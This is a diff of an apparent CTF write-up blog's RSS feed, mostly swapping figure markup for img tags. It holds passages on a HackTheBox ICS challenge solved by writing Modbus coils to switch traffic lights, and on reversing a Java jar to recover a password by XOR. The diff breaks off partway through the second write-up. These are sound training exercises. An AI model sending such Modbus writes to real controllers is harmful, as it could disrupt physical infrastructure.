+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/lighttheway/lights.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Looking at the picture we need to change the west side to green because the car is about to turn towards west for the first junction, and we have to turn the East side to Green for the 2nd and 4th junction, and finally the north side for 6th junction.&lt;/p&gt;
 &lt;p&gt;So the values for junction one are as follow:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[False, False, True, False, False, True, False, False, True, True, False, False]
@@ -1014,18 +940,14 @@ c.write_multiple_coils(1266, [False, False, True, False, False, True,False, Fals
 c.unit_id(6)
 c.write_multiple_coils(886,[False, False, True, False, False, True, False, False, True, True, False, False])
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After running the script, the car moved and I found the flag.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/lighttheway.gif&#34; &gt;
-		&lt;img src=&#34;/lighttheway/lighttheway.gif&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/lighttheway/lighttheway.gif&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Flag:&lt;code&gt;HTB{w3_se3_tH3_l1ght}&lt;/code&gt;&lt;/p&gt;
 </description>
         </item>
@@ -1035,100 +957,76 @@ c.write_multiple_coils(886,[False, False, True, False, False, True, False, False
         <pubDate>Mon, 15 Nov 2021 15:38:22 -0500</pubDate>
         
         <guid>/p/integrity-check/</guid>
-        <description>&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/integrity/challengeDescription.png&#34; &gt;
-		&lt;img src=&#34;/integrity/challengeDescription.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+        <description>&lt;p&gt;&lt;img src=&#34;/integrity/challengeDescription.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Attachment: &lt;a class=&#34;link&#34; href=&#34;https://github.com/Kasimir123/K3RN3LCTF-2021/blob/main/downloadable/integrity-check/IntegrityCheck.jar&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;File&lt;/a&gt;&lt;/p&gt;
 &lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
 &lt;p&gt;I started out by running the file.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar IntegrityCheck.jar
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/integrity/initial_run.png&#34; &gt;
-		&lt;img src=&#34;/integrity/initial_run.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			alt=&#34;Test&#34;&gt;
-	&lt;/a&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/integrity/initial_run.png&#34;
 	
-	&lt;figcaption&gt;Test&lt;/figcaption&gt;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Test&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;We can see that something is wrong in the function name.&lt;/p&gt;
 &lt;p&gt;Looking at the hint, we all can say that we have to use some sort of Java Bytecode modifying tool. So I searched up online and found quite a few.&lt;/p&gt;
 &lt;p&gt;The one that I found useful was the &lt;a class=&#34;link&#34; href=&#34;https://www.coley.software/Recaf/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;recaf&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Opening the IntegrityCheck.jar file
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/integrity/Opening.png&#34; &gt;
-		&lt;img src=&#34;/integrity/Opening.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			alt=&#34;Opening the file&#34;&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/integrity/Opening.png&#34;
 	
-	&lt;figcaption&gt;Opening the file&lt;/figcaption&gt;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Opening the file&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;The class name looks really wrong. But what is the real name?&lt;/p&gt;
 &lt;p&gt;I tried looking around for the real name, I didn&amp;rsquo;t find it until I used another tool. rej&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/integrity/ClassName.png&#34; &gt;
-		&lt;img src=&#34;/integrity/ClassName.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/integrity/ClassName.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;With this tool we can see the source file name. I don&amp;rsquo;t know why this is the case, but now I have my real class name.&lt;/p&gt;
 &lt;p&gt;Now to change the class name I first tried using rej to change it, it still gave me illegal method name error. So I changed the name of the function as well. After that it kept gave me &lt;code&gt;NullPointerException&lt;/code&gt; because I wasn&amp;rsquo;t changing it properly. I was able to fix that by using Recaf tool.&lt;/p&gt;
 &lt;p&gt;After changing the class and the method name I had the export to a new jar &lt;code&gt;changed.jar&lt;/code&gt; . I was able to successfully run this jar using this command&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;java -jar changed.jar&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/integrity/changedRun.png&#34; &gt;
-		&lt;img src=&#34;/integrity/changedRun.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/integrity/changedRun.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Alr, Now there are no errors.&lt;/p&gt;
 &lt;p&gt;Time to find the password.
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/integrity/password.png&#34; &gt;
-		&lt;img src=&#34;/integrity/password.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/integrity/password.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 After just scanning the decompiled code, I was able to find place where they are validating the password.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;String throw8 = throw6[0].getClassName();
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It is storing the name of the class in the variable throw8. (Let&amp;rsquo;s ignore other code for a while)&lt;/p&gt;
@@ -1141,47 +1039,35 @@ After just scanning the decompiled code, I was able to find place where they are
 &lt;p&gt;It&amp;rsquo;s takes the first 4 characters from the &lt;code&gt;throw9&lt;/code&gt; char array, and xor&amp;rsquo;s it with some number to validate the input.
 User given password is stored in &lt;code&gt;throw10&lt;/code&gt; char array.&lt;/p&gt;
 &lt;p&gt;To find the correct password we can just xorg the the values that we already know&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/integrity/pythonscript.png&#34; &gt;
-		&lt;img src=&#34;/integrity/pythonscript.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/integrity/pythonscript.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;I wrote a small python script to calculate the password. &lt;code&gt;GiCw:&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;After getting the password, I ran following command&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar changed.jar GiCw:
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/integrity/werid_output.png&#34; &gt;
-		&lt;img src=&#34;/integrity/werid_output.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/integrity/werid_output.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;I got the following output. It wasn&amp;rsquo;t the flag. I must have done something wrong.&lt;/p&gt;
 &lt;p&gt;After I re-analyze the code, I figured out that the code uses function name to compute the flag.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/integrity/flag_code.png&#34; &gt;
-		&lt;img src=&#34;/integrity/flag_code.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/integrity/flag_code.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;It uses the &lt;code&gt;throw7&lt;/code&gt; variable, which takes the method name.&lt;/p&gt;
 &lt;p&gt;So, if I keep the original method name, it will give me error, and if I change it it will give me wrong flag.&lt;/p&gt;
 &lt;p&gt;After thinking for a while. I came up with two solutions.&lt;/p&gt;
